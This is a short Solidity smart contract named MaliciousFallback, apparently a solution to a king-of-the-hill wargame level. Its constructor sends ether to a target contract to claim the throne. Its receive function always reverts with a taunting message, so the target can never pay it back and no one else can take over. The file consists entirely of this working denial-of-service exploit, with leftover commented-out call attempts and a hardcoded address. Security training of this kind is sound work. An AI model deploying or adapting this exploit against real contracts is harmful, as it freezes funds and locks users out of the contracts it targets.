// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract MaliciousFallback {

    constructor (address _king) payable {
        //13008896    // 14008896
        //0xE152aE0f0B3e321780dc213fba99F81966DE3C3C
        //address(_king).call({value: msg.value});
        //address(_king).call.value(msg.value)();
        //address(_king).call({value: msg.value});
        address(_king).call{value: msg.value}("");

        //payable(_king).transfer(msg.value);
    }

    receive() external payable  {
        revert("Ahhhhhhhhhhhhhhh! You loose!");
    }
}